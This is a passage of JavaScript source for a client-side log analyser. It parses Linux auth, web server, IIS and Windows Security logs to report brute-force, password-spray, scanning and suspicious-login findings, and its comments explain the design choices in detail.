/* ==========================================================================
   log-analyser.js — read a log file in this tab and say what happened in it.
   --------------------------------------------------------------------------
   The moment that produces this tool is always the same: somebody sends you a
   log, you are on a laptop with no SIEM and no time, and the question is "did
   anyone get in". Pasting a production auth.log into a web form to answer that
   is exactly the wrong move — it is a list of your usernames, your source
   addresses and your working hours — so this parses it here, in the tab, and
   makes no request of any kind.

   Five formats are read, because those are the five people actually have:

   - Linux auth.log / secure (sshd, sudo, su, PAM)
   - nginx and Apache access logs, combined and common
   - IIS W3C extended
   - Windows Security event exports as CSV
   - anything else that looks like syslog, as a fallback

   Detection is by scoring a sample of lines against each parser rather than by
   file extension, and the report says which one won and how many sample lines
   agreed. A format select overrides it, because auto-detection that cannot be
   corrected is worse than no auto-detection at all.

   Four decisions in here are worth stating up front, because they are the ones
   that separate a useful answer from a confident wrong one:

   1. Brute force and password spray are counted as different things. Most
      tools blur them into "failed logins from an IP", which is a shame,
      because they mean opposite things operationally. Many passwords against
      ONE account is someone who wants that account: lock it, look at what it
      can reach. One password against MANY accounts is someone who wants ANY
      account and is staying under the per-account lockout threshold: the
      lockout policy you are relying on is the thing that will not fire. So
      failures are clustered by source AND by the spread of accounts touched,
      and the two shapes get separate findings with separate advice.

   2. sshd and PAM both log the same failed SSH password, on two lines. Adding
      them up doubles every number in the report. So a pam_unix(sshd:auth)
      failure is deliberately NOT counted when sshd's own "Failed password"
      lines are present — and IS counted when they are absent, which happens on
      distributions that log only the PAM half. Both branches are reported.

   3. "Impossible travel" here is a timing statement, not a geography one.
      Nothing in this page resolves an address to a place; there is no GeoIP
      database and no lookup, by design. What it can say is that one account
      authenticated successfully from two different addresses within a few
      minutes, which is worth a human look and is not, on its own, evidence of
      anything. A VPN, a phone handing off to wifi and a NAT rebuild all
      produce it. The output says so every time it fires.

   4. Every finding prints the raw lines it came from, with line numbers. A
      claim you cannot check is an opinion, and an opinion does not belong in
      an incident ticket.

   What this is not: it is not a SIEM. There is no correlation across sources,
   no threat intelligence, no reputation lookup, no rule language, no storage
   and no history. It reads one file and describes it.
   ========================================================================== */

/* global LabTool */
(function () {
  'use strict';

  /* --- hard limits, so a 2 GB log cannot take the tab with it ------------
     The analysis is synchronous: one press of Analyse, one pause, one report.
     That is the right shape for a tool you run deliberately, but it means the
     ceiling has to be set where the pause is still a pause. Measured on the
     worst case a web log can present — a quarter of a million lines with a
     distinct path in every one — 16 MB lands around two and a half seconds.
     Twice that lands at five, which stops feeling like a wait and starts
     feeling like a hang. */
  var MAX_BYTES        = 16 * 1024 * 1024;
  var MAX_LINES        = 200000;
  var SAMPLE_LINES     = 600;      // lines the format detector looks at
  var MAX_EVIDENCE     = 6;        // raw lines quoted beneath one finding
  /* The pane wraps rather than scrolling sideways, like every other lab, so a
     quoted line is clipped at a length that still wraps to two or three
     readable rows instead of a paragraph of them. */
  var EVIDENCE_WIDTH   = 150;
  var MAX_PER_KIND     = 12;       // findings of one shape before it summarises
  var TIMELINE_BUCKETS = 40;
  var TOP_TALKERS      = 15;
  var TOP_ROWS         = 12;

  /* --- what counts as which attack shape --------------------------------
     These are thresholds, not truths. They are printed in the report so the
     reader can disagree with them rather than guess what they were. */
  var BRUTE_MIN_FAILS     = 8;   // failures from one source, few accounts
  var BRUTE_MAX_USERS     = 2;
  var SPRAY_MIN_USERS     = 5;   // distinct accounts touched from one source
  var SPRAY_MAX_PER_USER  = 3;   // and few tries each — the spray signature
  var SUCCESS_AFTER_MIN   = 3;   // failures before a success that make it news
  var SUCCESS_GAP_MS      = 6 * 3600 * 1000;
  var TRAVEL_WINDOW_MS    = 60 * 60 * 1000;
  var SCAN_MIN_404        = 15;  // 404s from one client before it is scanning
  var SCAN_404_RATIO      = 0.5;
  var SIZE_SIGMA          = 4;   // standard deviations for a size outlier
  var MAX_KEYS            = 25000; // distinct paths / user agents held at once

  var out = LabTool.out('tool-out');

  /* ======================================================================
     Output. Everything printed also lands in `mirror`, which is what the
     download and copy buttons hand over — a report you can paste into a
     ticket is most of the value of a tool like this, and rebuilding it
     separately from the rendered version is how the two drift apart.
     ====================================================================== */

  var mirror = [];

  var R = {
    clear: function () { mirror.length = 0; out.clear(); return R; },
    line: function (text, cls) {
      var s = (text === undefined || text === null) ? '' : String(text);
      mirror.push(s);
      out.line(s, cls);
      return R;
    },
    heading: function (t) { return R.line(t, 't-info'); },
    dim:     function (t) { return R.line(t, 't-dim'); },
    ok:      function (t) { return R.line(t, 't-ok'); },
    warn:    function (t) { return R.line(t, 't-warn'); },
    err:     function (t) { return R.line(t, 't-err'); },
    row: function (label, value, cls) {
      var text = String(label);
      var left = text.length >= 22 ? text + '  ' : text.padEnd(22, ' ');
      mirror.push(left + String(value));
      out.write(left, 't-dim');
      out.line(String(value), cls);
      return R;
    },
    rule: function () { return R.line('─'.repeat(52), 't-dim'); },
    text: function () { return mirror.join('\n'); }
  };

  /* ======================================================================
     Small helpers
     ====================================================================== */

  function num(n) {
    return String(n).replace(/\B(?=(\d{3})+(?!\d))/g, ',');
  }

  /* Enough English to stop the report saying "2 addresss" and "9 probe familys".
     A finding that cannot spell is a finding people trust less, and they are
     right to. */
  function plural(n, word) {
    if (n === 1) return num(n) + ' ' + word;
    var w = String(word);
    if (/[^aeiou]y$/.test(w)) w = w.slice(0, -1) + 'ies';
    else if (/(?:s|x|z|ch|sh)$/.test(w)) w += 'es';
    else w += 's';
    return num(n) + ' ' + w;
  }

  function pct(part, total) {
    if (!total) return '0.0%';
    return ((part / total) * 100).toFixed(1) + '%';
  }

  function pad(text, width) {
    var s = String(text);
    return s.length >= width ? s + ' ' : s.padEnd(width, ' ');
  }

  function padLeft(text, width) {
    var s = String(text);
    while (s.length < width) s = ' ' + s;
    return s;
  }

  function bar(fraction, width) {
    if (!isFinite(fraction) || fraction < 0) fraction = 0;
    var filled = Math.round(fraction * width);
    if (fraction > 0 && filled === 0) filled = 1;
    if (filled > width) filled = width;
    return '█'.repeat(filled) + '·'.repeat(width - filled);
  }

  /* The pane is written with textContent, so nothing here can inject markup —
     but a log line can carry an ANSI escape or a lone control byte, and those
     scramble the layout of a <pre> just as effectively. Flatten them. */
  function safe(text, limit) {
    var s = String(text === undefined || text === null ? '' : text);
    if (limit && s.length > limit) s = s.slice(0, limit) + '…';
    return s.replace(/[\u0000-\u0008\u000a-\u001f\u007f-\u009f]/g, '.');
  }

  function bump(map, key, by) {
    map[key] = (map[key] || 0) + (by === undefined ? 1 : by);
  }

  function topKeys(map, limit) {
    var keys = Object.keys(map);
    keys.sort(function (a, b) {
      if (map[b] !== map[a]) return map[b] - map[a];
      return a < b ? -1 : 1;
    });
    return limit ? keys.slice(0, limit) : keys;
  }

  function countKeys(map) { return Object.keys(map).length; }

  /* Distinct keys across two maps. Adding the two counts instead would report
     an account that both failed and succeeded from one source as two accounts,
     and that account is precisely the interesting one. */
  function unionCount(a, b) {
    var seen = {}, n = 0, k;
    for (k in a) if (Object.prototype.hasOwnProperty.call(a, k) && !seen[k]) { seen[k] = 1; n++; }
    for (k in b) if (Object.prototype.hasOwnProperty.call(b, k) && !seen[k]) { seen[k] = 1; n++; }
    return n;
  }

  /* A counting map with a ceiling on how many distinct keys it will grow.

     The obvious way to write that is `if (Object.keys(map).length < cap)` on
     every line, which walks the whole map once per log line — quadratic, and
     on a 200,000-line access log with a distinct path per request it turns a
     two-second analysis into a hung tab. The count is carried alongside the
     map instead, on `owner[field]`, so the test is a comparison.

     Once the ceiling is reached, new keys are dropped but existing ones keep
     counting: the tail of a long log still updates the paths already seen. */
  function capBump(map, key, owner, field, cap) {
    if (map[key] === undefined) {
      if (owner[field] >= cap) return;
      map[key] = 0;
      owner[field]++;
    }
    map[key]++;
  }

  function fmtTime(ms) {
    if (ms === null || ms === undefined || !isFinite(ms)) return 'unknown';
    var d = new Date(ms);
    if (isNaN(d.getTime())) return 'unknown';
    return d.toISOString().slice(0, 19).replace('T', ' ');
  }

  function duration(ms) {
    if (!isFinite(ms) || ms < 0) return 'unknown';
    var s = ms / 1000;
    if (s < 90) return s.toFixed(1) + ' s';
    var m = Math.floor(s / 60);
    if (m < 90) return m + ' min';
    var h = Math.floor(m / 60);
    if (h < 48) return h + 'h ' + (m - h * 60) + 'm';
    return Math.floor(h / 24) + 'd ' + (h % 24) + 'h';
  }

  /* An address family test that needs no lookup: RFC1918, loopback, CGNAT and
     link-local. Used only to add a note, never to suppress a finding — a
     private source is the interesting one in a lateral-movement case. */
  function isPrivate(ip) {
    if (!ip) return false;
    if (ip.indexOf(':') >= 0) return /^(::1$|fc|fd|fe80)/i.test(ip);
    var m = /^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/.exec(ip);
    if (!m) return false;
    var a = +m[1], b = +m[2];
    return a === 10 || a === 127 || (a === 192 && b === 168) ||
           (a === 172 && b >= 16 && b <= 31) || (a === 169 && b === 254) ||
           (a === 100 && b >= 64 && b <= 127);
  }

  function slash24(ip) {
    var m = /^(\d{1,3}\.\d{1,3}\.\d{1,3})\.\d{1,3}$/.exec(ip || '');
    return m ? m[1] : null;
  }

  /* ======================================================================
     Timestamps

     Four shapes turn up, and the only one that carries a time zone is the
     Apache/nginx bracket form. Everything else is printed back exactly as the
     log wrote it — no conversion, no guessing at the host's zone, because a
     silently shifted timestamp in an incident report is worse than an
     unlabelled one. The report states the convention it used.
     ====================================================================== */

  var MONTHS = {
    jan: 0, feb: 1, mar: 2, apr: 3, may: 4, jun: 5,
    jul: 6, aug: 7, sep: 8, oct: 9, nov: 10, dec: 11
  };

  /* BSD syslog has no year in it. Rather than assume the current one and land
     a December log a year in the future every January, the first timestamp
     decides the base year: if placing it in this year puts it more than a day
     ahead of now, it belongs to last year. A month that jumps backwards after
     that is a new year rolling over inside the file. */
  function newClock() { return { year: null, prevMonth: -1 }; }

  function syslogTime(clock, mon, day, hh, mm, ss) {
    var now = Date.now();
    if (clock.year === null) {
      var y = new Date(now).getUTCFullYear();
      if (Date.UTC(y, mon, day, hh, mm, ss) > now + 36 * 3600 * 1000) y -= 1;
      clock.year = y;
    }
    if (clock.prevMonth >= 0 && mon < clock.prevMonth - 6) clock.year += 1;
    clock.prevMonth = mon;
    return Date.UTC(clock.year, mon, day, hh, mm, ss);
  }

  var RE_SYSLOG_TS = /^([A-Za-z]{3})\s+(\d{1,2})\s+(\d{2}):(\d{2}):(\d{2})/;
  var RE_ISO_TS    = /^(\d{4})-(\d{2})-(\d{2})[T ](\d{2}):(\d{2}):(\d{2})(?:[.,](\d{1,9}))?(Z|[+-]\d{2}:?\d{2})?/;

  function isoTime(m) {
    var base = Date.UTC(+m[1], +m[2] - 1, +m[3], +m[4], +m[5], +m[6],
                        m[7] ? Math.round(+('0.' + m[7]) * 1000) : 0);
    var zone = m[8];
    if (!zone || zone === 'Z') return base;
    var sign = zone.charAt(0) === '-' ? 1 : -1;
    var digits = zone.slice(1).replace(':', '');
    return base + sign * ((+digits.slice(0, 2)) * 60 + (+digits.slice(2))) * 60000;
  }

  /* 31/Aug/2026:12:34:56 +0530 — the one format that states its offset, so
     this is the one place a conversion is honest. Stored as a real epoch. */
  var RE_CLF_TS = /^(\d{1,2})\/([A-Za-z]{3})\/(\d{4}):(\d{2}):(\d{2}):(\d{2})\s*([+-]\d{4})?$/;

  function clfTime(text) {
    var m = RE_CLF_TS.exec(String(text).replace(/^\[|\]$/g, ''));
    if (!m) return null;
    var mon = MONTHS[m[2].toLowerCase()];
    if (mon === undefined) return null;
    var base = Date.UTC(+m[3], mon, +m[1], +m[4], +m[5], +m[6]);
    if (m[7]) {
      var sign = m[7].charAt(0) === '-' ? 1 : -1;
      base += sign * ((+m[7].slice(1, 3)) * 60 + (+m[7].slice(3, 5))) * 60000;
    }
    return base;
  }

  /* ======================================================================
     Format detection

     Scored on a sample rather than decided by the first line: real files start
     with a banner, a rotation marker or a blank, and a detector that trusts
     line one gets those wrong. Each test is a shape only that format has.
     ====================================================================== */

  var FORMATS = {
    auth:   'Linux auth.log / secure',
    web:    'nginx / Apache access log',
    iis:    'IIS W3C extended',
    winsec: 'Windows Security event CSV',
    syslog: 'Generic syslog'
  };

  var RE_WEB_LINE = /^\S+\s+\S+\s+\S+\s+\[[^\]]+\]\s+"[^"]*"\s+\d{3}\s+(\d+|-)/;
  /* vhost_combined puts the served hostname in front, so the bracketed date
     lands one field later. Without this the whole format reads as "not a web
     log", which is a silent and total failure on a very common configuration. */
  var RE_WEB_VHOST = /^\S+\s+\S+\s+\S+\s+\S+\s+\[[^\]]+\]\s+"[^"]*"\s+\d{3}\s+(\d+|-)/;
  var RE_SYSLOG_LINE = /^[A-Za-z]{3}\s+\d{1,2}\s+\d{2}:\d{2}:\d{2}\s+\S+\s+\S/;
  var RE_RFC5424 = /^<\d{1,3}>\d\s+\d{4}-\d{2}-\d{2}T/;
  var RE_AUTH_WORDS = /sshd\[|sudo:|su\[|su:|pam_unix\(|Failed password|Accepted (?:password|publickey|keyboard)|authentication failure|Invalid user|polkitd|systemd-logind/;

  function detect(text, lines) {
    var score = { auth: 0, web: 0, iis: 0, winsec: 0, syslog: 0 };
    var i, line, seen = 0;

    /* IIS announces itself in a directive, and nothing else does. One is
       enough — this is not a vote, it is a signature. */
    if (/^#(?:Fields|Software|Version|Date):/m.test(text.slice(0, 8192))) {
      return { id: 'iis', label: FORMATS.iis, sampled: 0, matched: 0,
               why: 'a #Fields: / #Software: directive, which only the W3C extended format writes' };
    }

    for (i = 0; i < lines.length && seen < SAMPLE_LINES; i++) {
      line = lines[i];
      if (!line || !line.replace(/\s/g, '')) continue;
      if (line.charAt(0) === '#') continue;
      seen++;
      if (RE_WEB_LINE.test(line) || RE_WEB_VHOST.test(line)) score.web++;
      if (RE_SYSLOG_LINE.test(line) || RE_RFC5424.test(line)) {
        score.syslog++;
        if (RE_AUTH_WORDS.test(line)) score.auth++;
      }
      if (/(?:^|,)"?(?:4624|4625|4634|4740|4771|4776|4768|4672)"?,/.test(line) ||
          /Microsoft-Windows-Security-Auditing/.test(line)) {
        score.winsec++;
      }
    }

    /* A CSV export's header row is worth more than any single data row,
       because the data rows of a Windows CSV are mostly one enormous quoted
       message field and match very little else. */
    var head = lines.length ? lines[0] : '';
    if (/(?:^|[,\t;])\s*"?(?:Event\s?ID|EventID|Keywords|TimeCreated|Task\s?Category)"?\s*(?:[,\t;]|$)/i.test(head)) {
      score.winsec += 25;
    }

    var best = 'syslog', bestScore = 0, k;
    for (k in score) {
      if (Object.prototype.hasOwnProperty.call(score, k) && score[k] > bestScore) {
        bestScore = score[k];
        best = k;
      }
    }
    /* auth.log lines are syslog lines, so the generic parser always ties or
       beats the specific one. Prefer the specific one whenever a meaningful
       slice of the sample carried authentication vocabulary. */
    if (score.auth >= 3 && score.auth >= score.syslog * 0.15) best = 'auth';
    if (bestScore === 0) best = 'syslog';

    var why;
    if (best === 'web') why = num(score.web) + ' of ' + num(seen) + ' sampled lines matched the combined/common log shape';
    else if (best === 'auth') why = num(score.auth) + ' of ' + num(seen) + ' sampled lines were syslog carrying sshd / sudo / PAM vocabulary';
    else if (best === 'winsec') why = 'a CSV header naming Event ID, or rows carrying Security-Auditing event numbers';
    else why = num(score.syslog) + ' of ' + num(seen) + ' sampled lines matched a syslog timestamp, and nothing more specific did';

    return {
      id: best, label: FORMATS[best], sampled: seen,
      matched: score[best], why: why, scores: score
    };
  }

  /* ======================================================================
     Result container
     ====================================================================== */

  function newResult(fmt, lines) {
    return {
      format: fmt,
      lines: lines,
      kind: 'auth',            // 'auth' or 'web' — which detail section applies
      parsed: 0,
      auth: [],                // { n, t, src, user, ok, method, note, txt }
      probes: [],              // username probes that are NOT login attempts
      changes: [],             // account / privilege modifications
      web: [],                 // { n, t, ip, user, method, path, query, status, bytes, ua, ref }
      pamSshd: [],             // held back — see the header, point 2
      sshdFails: 0,
      programs: {},            // generic syslog: counts by program
      messages: {},            // generic syslog: normalised repeated messages
      /* Plain number arrays rather than event objects. A generic syslog file
         has no authentication events to plot, so the timeline falls back to
         every timestamped line — and on a 200,000-line file, one small object
         per line is megabytes spent to hold two numbers. */
      times: [], badTimes: [],
      timeNote: '',
      notes: [],
      truncated: false
    };
  }

  function noteTime(res, t) {
    if (t === null) return;
    if (res.firstT === undefined || res.firstT === null || t < res.firstT) res.firstT = t;
    if (res.lastT === undefined || res.lastT === null || t > res.lastT) res.lastT = t;
  }

  /* ======================================================================
     Parser 1 — Linux auth.log / secure, and the generic syslog fallback

     Rules are tried in order and the first match wins, which matters: sshd
     writes "Failed password for invalid user bob" and, separately, "Invalid
     user bob". Only the first is an attempt; the second is the connection
     announcing a username that does not exist. Counting both doubles every
     brute-force number in the report, so the second becomes a probe.
     ====================================================================== */

  var RE_SSH_FAIL = /Failed (password|publickey|keyboard-interactive\/pam|keyboard-interactive|none|hostbased|gssapi-with-mic) for (invalid user )?(\S+) from (\S+)/;
  var RE_SSH_OK   = /Accepted (password|publickey|keyboard-interactive\/pam|keyboard-interactive|none|hostbased|gssapi-with-mic) for (\S+) from (\S+)/;
  var RE_SSH_MAX  = /error: maximum authentication attempts exceeded for (invalid user )?(\S+) from (\S+)/;
  var RE_INVALID  = /Invalid user (\S+) from (\S+)/;
  var RE_PREAUTH  = /(?:Connection closed by|Disconnected from) (?:authenticating|invalid) user (\S+) (\S+) port/;
  var RE_PAM_FAIL = /pam_unix\(([^:]+):auth\): authentication failure;/;
  var RE_PAM_HOST = /rhost=([^\s]+)/;
  var RE_PAM_USER = /\suser=([^\s]+)/;
  var RE_SU_FAIL  = /FAILED SU \(to ([^)]+)\)\s+(\S+)/;
  var RE_SUDO_OK= /sudo:\s+(\S+)\s+:\s+TTY=[^;]*;.*COMMAND=(.*)$/;
  var RE_SUDO_BAD = /sudo:\s+(\S+)\s+:\s+(\d+ incorrect password attempt|user NOT in sudoers|command not allowed|no tty present)/;
  var RE_PROG     = /^(?:[A-Za-z]{3}\s+\d{1,2}\s+\d{2}:\d{2}:\d{2}|\S+)\s+\S+\s+([A-Za-z0-9_.\/-]+)(?:\[\d+\])?:/;
  /* Only used to shade the timeline of a generic syslog file, where there is
     no notion of a failed login. It is a keyword match and nothing more —
     "error" in a message is not a finding, it is a colour. */
  var RE_TROUBLE  = /\b(?:error|failed|failure|denied|refused|critical|panic|fatal|segfault|timed out|timeout|unreachable)\b/i;

  function parseSyslogish(lines, res, wantAuth) {
    var clock = newClock();
    var i, line, t, m, rest, host = null;

    for (i = 0; i < lines.length; i++) {
      line = lines[i];
      if (!line || !line.replace(/\s/g, '')) continue;
      var n = i + 1;

      /* Timestamp first, and it is allowed to be missing — plenty of container
         logs are bare messages. An event with no time still counts; it just
         cannot appear in the timeline or in any timing finding. */
      t = null;
      rest = line;
      m = RE_SYSLOG_TS.exec(line);
      if (m) {
        var mon = MONTHS[m[1].toLowerCase()];
        if (mon !== undefined) t = syslogTime(clock, mon, +m[2], +m[3], +m[4], +m[5]);
        rest = line.slice(m[0].length);
      } else {
        var iso = RE_ISO_TS.exec(line.replace(/^<\d{1,3}>\d\s+/, ''));
        if (iso) t = isoTime(iso);
      }
      noteTime(res, t);
      res.parsed++;
      if (t !== null) {
        res.times.push(t);
        if (RE_TROUBLE.test(line)) res.badTimes.push(t);
      }

      var pm = RE_PROG.exec(line);
      if (pm) bump(res.programs, pm[1]);

      /* --- successes ---------------------------------------------------- */
      m = RE_SSH_OK.exec(line);
      if (m) {
        res.auth.push({ n: n, t: t, src: m[3], user: m[2], ok: true,
                        method: 'ssh ' + m[1] });
        continue;
      }

      /* --- failures ----------------------------------------------------- */
      m = RE_SSH_FAIL.exec(line);
      if (m) {
        res.sshdFails++;
        res.auth.push({ n: n, t: t, src: m[4], user: m[3], ok: false,
                        method: 'ssh ' + m[1],
                        note: m[2] ? 'account does not exist' : '' });
        continue;
      }

      m = RE_SSH_MAX.exec(line);
      if (m) {
        res.sshdFails++;
        res.auth.push({ n: n, t: t, src: m[3], user: m[2], ok: false,
                        method: 'ssh', note: 'hit MaxAuthTries in one connection' });
        continue;
      }

      m = RE_PAM_FAIL.exec(line);
      if (m) {
        var service = m[1];
        var hm = RE_PAM_HOST.exec(line);
        var um = RE_PAM_USER.exec(line);
        var rec = { n: n, t: t, src: hm ? hm[1] : 'local', user: um ? um[1] : '(not logged)',
                    ok: false, method: 'PAM ' + service };
        /* The double-count guard. sshd already logged this attempt on its own
           line; holding these aside lets the caller decide, once it knows
           whether those lines exist at all. */
        if (/^sshd/.test(service)) res.pamSshd.push(rec);
        else res.auth.push(rec);
        continue;
      }

      m = RE_SU_FAIL.exec(line);
      if (m) {
        res.auth.push({ n: n, t: t, src: 'local', user: m[2], ok: false,
                        method: 'su to ' + m[1] });
        continue;
      }

      m = RE_SUDO_BAD.exec(line);
      if (m) {
        res.auth.push({ n: n, t: t, src: 'local', user: m[1], ok: false,
                        method: 'sudo', note: m[2] });
        continue;
      }

      m = RE_SUDO_OK.exec(line);
      if (m) {
        res.auth.push({ n: n, t: t, src: 'local', user: m[1], ok: true,
                        method: 'sudo', note: safe(m[2], 90) });
        continue;
      }

      /* --- probes, which are not attempts -------------------------------- */
      m = RE_INVALID.exec(line);
      if (m) { res.probes.push({ n: n, t: t, src: m[2], user: m[1] }); continue; }

      m = RE_PREAUTH.exec(line);
      if (m) { res.probes.push({ n: n, t: t, src: m[2], user: m[1] }); continue; }

      /* --- account and privilege changes --------------------------------- */
      m = /useradd\[\d+\]: new user: name=([^,]+)/.exec(line);
      if (m) { res.changes.push({ n: n, t: t, what: 'account created: ' + m[1] }); continue; }
      m = /usermod\[\d+\]: add '([^']+)' to group '([^']+)'/.exec(line);
      if (m) { res.changes.push({ n: n, t: t, what: m[1] + ' added to group ' + m[2] }); continue; }
      m = /passwd\[\d+\]: password (?:changed|for) (?:for )?([^\s,]+)/.exec(line);
      if (m) { res.changes.push({ n: n, t: t, what: 'password changed for ' + m[1] }); continue; }
      if (/Authorized keys? (?:file )?(?:added|updated)|new group: name=/.test(line)) {
        res.changes.push({ n: n, t: t, what: safe(line, 120) });
        continue;
      }

      /* --- generic syslog: what repeats ----------------------------------
         The message starts after the program tag's colon. Stripping a fixed
         number of leading words instead eats the first real word of any line
         that is not syslog-shaped, and the fallback branch is exactly where
         non-syslog lines end up. */
      if (!wantAuth) {
        var body = rest;
        if (pm) {
          var colon = line.indexOf(':', line.indexOf(pm[1]) + pm[1].length);
          if (colon >= 0) body = line.slice(colon + 1);
        }
        bump(res.messages, safe(normalise(body), 110));
      }

      if (!host && (m = /^[A-Za-z]{3}\s+\d{1,2}\s+\d{2}:\d{2}:\d{2}\s+(\S+)/.exec(line))) {
        host = m[1];
      }
    }

    /* The fallback branch. A distribution that logs only the PAM half of an
       SSH failure would otherwise report zero failed logins on a log full of
       them, which is the worst failure mode this tool has. */
    if (res.sshdFails === 0 && res.pamSshd.length) {
      for (i = 0; i < res.pamSshd.length; i++) res.auth.push(res.pamSshd[i]);
      res.notes.push('This log carries PAM authentication failures for sshd but no sshd ' +
                     '"Failed password" lines, so the PAM lines were counted as the attempts. ' +
                     'Where both are present the PAM copies are dropped, because they are the ' +
                     'same attempt logged twice.');
    } else if (res.pamSshd.length) {
      res.notes.push(plural(res.pamSshd.length, 'pam_unix(sshd:auth) failure line') +
                     (res.pamSshd.length === 1 ? ' was' : ' were') +
                     ' not counted: sshd logged the same attempts itself, and adding ' +
                     'both would double every number below.');
    }

    res.host = host;
    res.timeNote = 'Syslog timestamps carry no time zone, so they are shown exactly as the log wrote them.';
  }

  /* Collapse the parts of a message that vary so identical events group. */
  function normalise(text) {
    return String(text)
      .replace(/\b\d{1,3}(?:\.\d{1,3}){3}\b/g, '<ip>')
      .replace(/\[\d+\]/g, '[<pid>]')
      .replace(/\b0x[0-9a-fA-F]+\b/g, '<hex>')
      .replace(/\b\d+\b/g, '<n>')
      .replace(/\s+/g, ' ')
      .replace(/^\s+|\s+$/g, '');
  }

  /* ======================================================================
     Parser 2 — nginx / Apache access logs

     Tokenised by hand rather than matched with one large regex. Access log
     formats are edited constantly: people append $request_time, put $host in
     front, add an upstream field. A tokeniser that understands "quoted" and
     [bracketed] runs survives all of that; a fixed regex matches the default
     and silently returns nothing for everybody else's.
     ====================================================================== */

  function tokenise(line) {
    var toks = [], i = 0, len = line.length, c, start;
    while (i < len) {
      c = line.charAt(i);
      if (c === ' ' || c === '\t') { i++; continue; }
      if (c === '"') {
        start = ++i;
        while (i < len && !(line.charAt(i) === '"' && line.charAt(i - 1) !== '\\')) i++;
        toks.push(line.slice(start, i));
        i++;
      } else if (c === '[') {
        start = ++i;
        while (i < len && line.charAt(i) !== ']') i++;
        toks.push(line.slice(start, i));
        i++;
      } else {
        start = i;
        while (i < len && line.charAt(i) !== ' ' && line.charAt(i) !== '\t') i++;
        toks.push(line.slice(start, i));
      }
    }
    return toks;
  }

  var RE_IPISH = /^(\d{1,3}(?:\.\d{1,3}){3}|[0-9A-Fa-f:]{3,45})$/;

  /* Payload patterns are matched against the raw request AND one decode of it,
     joined together. Percent-encoding is the first thing anyone reaches for to
     get a payload past a string match — "%27%20OR%20" is the same injection as
     "' OR " and a matcher that only sees the raw line misses it. One decode,
     not a loop: repeated decoding until it stops changing turns an innocent
     literal "%2525" into a match for something it never was. */
  function decodeOnce(text) {
    var t = String(text).replace(/\+/g, ' ');
    try { return decodeURIComponent(t); } catch (err) { return t; }
  }

  /* The indexOf pair is not a micro-optimisation, it is the difference between
     a report and a frozen tab: this runs once per request line, and on a log
     of a quarter of a million ordinary URLs neither branch of decodeOnce can
     change anything. Two character scans replace an allocation, a regex
     replace and a try/catch on every one of them. */
  function probeText(target) {
    if (target.indexOf('%') < 0 && target.indexOf('+') < 0) return target;
    var d = decodeOnce(target);
    return d === target ? target : (target + '\n' + d);
  }

  function parseWeb(lines, res) {
    var i, toks, ip, at, t, req, status, bytes, parts, path, query;

    for (i = 0; i < lines.length; i++) {
      var line = lines[i];
      if (!line || line.charAt(0) === '#' || !line.replace(/\s/g, '')) continue;
      toks = tokenise(line);
      if (toks.length < 6) continue;

      /* vhost_combined puts the served hostname first. Shift past anything at
         the head of the line that is not an address until one turns up. */
      var base = 0;
      while (base < 3 && !RE_IPISH.test(toks[base])) base++;
      if (base >= 3) continue;
      ip = toks[base];

      at = clfTime(toks[base + 3]);
      req = toks[base + 4] || '';
      status = parseInt(toks[base + 5], 10);
      if (!isFinite(status)) continue;
      bytes = toks[base + 6] === '-' ? 0 : parseInt(toks[base + 6], 10);
      if (!isFinite(bytes)) bytes = 0;

      parts = req.split(' ');
      var method = parts.length > 1 ? parts[0] : '-';
      var target = parts.length > 1 ? parts[1] : req;
      var q = target.indexOf('?');
      path = q >= 0 ? target.slice(0, q) : target;
      query = q >= 0 ? target.slice(q + 1) : '';

      t = at;
      noteTime(res, t);
      res.parsed++;

      var rec = {
        n: i + 1, t: t, ip: ip, user: toks[base + 2] === '-' ? '' : toks[base + 2],
        method: method, path: path, query: query, target: target,
        status: status, bytes: bytes,
        ref: toks[base + 7] === '-' ? '' : (toks[base + 7] || ''),
        ua: toks[base + 8] === '-' ? '' : (toks[base + 8] || ''),
        probe: probeText(target),
        raw: req
      };
      res.web.push(rec);
      webAuthEvent(res, rec);
      if (res.web.length >= MAX_LINES) break;
    }
    res.timeNote = 'Access log timestamps carry an explicit UTC offset, so they are converted ' +
                   'and shown in UTC. A log written at +05:30 will read five and a half hours earlier here.';
  }

  /* HTTP authentication leaves the same trail as SSH does, so it goes through
     the same clustering: a 401 or 403 is a failure, and a request that carries
     a remote user and did not fail is a success. Without this, a web log full
     of a credential-stuffing run against /admin produces a status table and no
     finding at all. */
  function webAuthEvent(res, rec) {
    /* 401 is always an authentication failure. 403 is only one when the client
       actually presented a user — an unauthenticated 403 is usually a WAF rule
       or a blocked path, and counting those as failed logins turns every
       scanner into a fake brute-force finding. */
    if (rec.status === 401 || (rec.status === 403 && rec.user)) {
      res.auth.push({ n: rec.n, t: rec.t, src: rec.ip,
                      user: rec.user || '(no user sent)', ok: false,
                      method: 'HTTP ' + rec.status, path: rec.path });
    } else if (rec.user && rec.status < 400) {
      res.auth.push({ n: rec.n, t: rec.t, src: rec.ip, user: rec.user, ok: true,
                      method: 'HTTP ' + rec.status, path: rec.path });
    }
  }

  /* ======================================================================
     Parser 3 — IIS W3C extended

     The field list is a directive, not a convention, and it may legally change
     partway down the file. So the header is re-read every time it appears
     rather than captured once at the top.
     ====================================================================== */

  function parseIis(lines, res) {
    var fields = null, idx = {}, i, k, cols, line;

    for (i = 0; i < lines.length; i++) {
      line = lines[i];
      if (!line || !line.replace(/\s/g, '')) continue;
      if (line.charAt(0) === '#') {
        var fm = /^#Fields:\s*(.*)$/i.exec(line);
        if (fm) {
          fields = fm[1].replace(/^\s+|\s+$/g, '').split(/\s+/);
          idx = {};
          for (k = 0; k < fields.length; k++) idx[fields[k].toLowerCase()] = k;
        }
        continue;
      }
      if (!fields) continue;
      cols = line.split(/\s+/);
      if (cols.length < fields.length - 2) continue;

      var get = function (name) {
        var j = idx[name];
        if (j === undefined || j >= cols.length) return '';
        return cols[j] === '-' ? '' : cols[j];
      };

      var date = get('date'), time = get('time');
      var t = null;
      if (date && time) {
        var im = RE_ISO_TS.exec(date + 'T' + time + 'Z');
        if (im) t = isoTime(im);
      }
      noteTime(res, t);
      res.parsed++;

      var status = parseInt(get('sc-status'), 10);
      if (!isFinite(status)) status = 0;
      var sent = parseInt(get('sc-bytes'), 10);
      if (!isFinite(sent)) sent = 0;
      var uri = get('cs-uri-stem');
      var query = get('cs-uri-query');

      var rec = {
        n: i + 1, t: t,
        ip: get('c-ip'), user: get('cs-username'),
        method: get('cs-method') || '-',
        path: uri, query: query,
        target: query ? uri + '?' + query : uri,
        status: status, sub: get('sc-substatus'), bytes: sent,
